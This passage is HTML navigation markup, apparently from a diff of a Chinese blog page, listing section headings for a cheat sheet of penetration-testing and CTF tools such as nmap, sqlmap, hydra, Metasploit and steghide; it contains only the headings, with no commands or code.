nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-2"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cewl"><span class="nav-text">Cewl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fcrackzip"><span class="nav-text">fcrackzip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hydra"><span class="nav-text">hydra</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-5"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gobuster"><span class="nav-text">gobuster</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enum4Linux"><span class="nav-text">Enum4Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E5%92%8C%E7%A4%BA%E4%BE%8B"><span class="nav-text">常用参数和示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stegseek"><span class="nav-text">stegseek</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-6"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcpdump"><span class="nav-text">tcpdump</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medusa"><span class="nav-text">medusa</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-7"><span class="nav-text">常用参数</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap"><span class="nav-text">nmap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap"><span class="nav-text">sqlmap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-1"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#John-the-Ripper"><span class="nav-text">John the Ripper</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-2"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-1"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wpscan"><span class="nav-text">wpscan</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-3"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wfuzz"><span class="nav-text">wfuzz</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84-z-%E9%80%89%E9%A1%B9%EF%BC%9A"><span class="nav-text">常见的 -z 选项：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%97%A0%E6%95%88%E5%93%8D%E5%BA%94"><span class="nav-text">过滤无效响应</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#binwalk"><span class="nav-text">binwalk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dos2Unix"><span class="nav-text">Dos2Unix</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SearchSploit"><span class="nav-text">SearchSploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploit-msfconsole"><span class="nav-text">Metasploit (msfconsole)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-4"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-2"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cewl"><span class="nav-text">Cewl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fcrackzip"><span class="nav-text">fcrackzip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hydra"><span class="nav-text">hydra</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-5"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gobuster"><span class="nav-text">gobuster</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enum4Linux"><span class="nav-text">Enum4Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E5%92%8C%E7%A4%BA%E4%BE%8B"><span class="nav-text">常用参数和示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stegseek"><span class="nav-text">stegseek</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-6"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#steghide"><span class="nav-text">steghide</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zsteg"><span class="nav-text">zsteg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rax2"><span class="nav-text">rax2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcpdump"><span class="nav-text">tcpdump</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medusa"><span class="nav-text">medusa</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-7"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh-keygen"><span class="nav-text">ssh-keygen</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf-pattern-create"><span class="nav-text">msf-pattern_create</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf-pattern-offset"><span class="nav-text">msf-pattern_offset</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msfvenom"><span class="nav-text">msfvenom</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fscan"><span class="nav-text">fscan</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
